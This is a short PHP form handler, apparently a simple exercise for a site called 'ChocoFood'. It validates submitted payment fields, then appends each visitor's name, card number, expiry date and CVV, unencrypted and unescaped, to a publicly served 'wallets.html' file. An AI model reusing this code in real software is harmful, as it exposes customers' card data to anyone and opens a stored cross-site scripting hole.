<!DOCTYPE >
<html>
	<head>
		<title>ChocoFood</title>
		<link href="../css/wallets.css" type="text/css" rel="stylesheet" />
	</head>

	<body>

		<?php
		$cardnumPattern = '(\d{4}([-]|)\d{4}([-]|)\d{4}([-]|)\d{4})';

		if (isset($_REQUEST['name']) && ($_REQUEST['name'] != "") && 
			isset($_REQUEST['creditcard']) && preg_match ($cardnumPattern, $_REQUEST['creditcard']) && 
            isset($_REQUEST['cvv']) && ($_REQUEST['cvv'] != "") && 
            isset($_REQUEST['date']) && ($_REQUEST['date'] != "")) {
		?>


		
		<h1>Thanks!</h1>

		<p>Your information has been recorded.</p>

		<?php
		file_put_contents("wallets.html", $_POST['name'], FILE_APPEND);
        file_put_contents("wallets.html", "; ", FILE_APPEND);
        file_put_contents("wallets.html", $_POST['creditcard'], FILE_APPEND);
        file_put_contents("wallets.html", "; ", FILE_APPEND);
        file_put_contents("wallets.html", $_POST['date'], FILE_APPEND);
        file_put_contents("wallets.html", "; ", FILE_APPEND);
        file_put_contents("wallets.html", $_POST['cvv'], FILE_APPEND);
        file_put_contents("wallets.html", "<br>", FILE_APPEND);
		?>
		<?php
	}
	else {
		?>

		<h1>Sorry</h1>
		<p>You didn't fill out the form completely. <a href="wallet.html">Try again?</a></p>
		<?php
	}
		?>
	</body>
</html>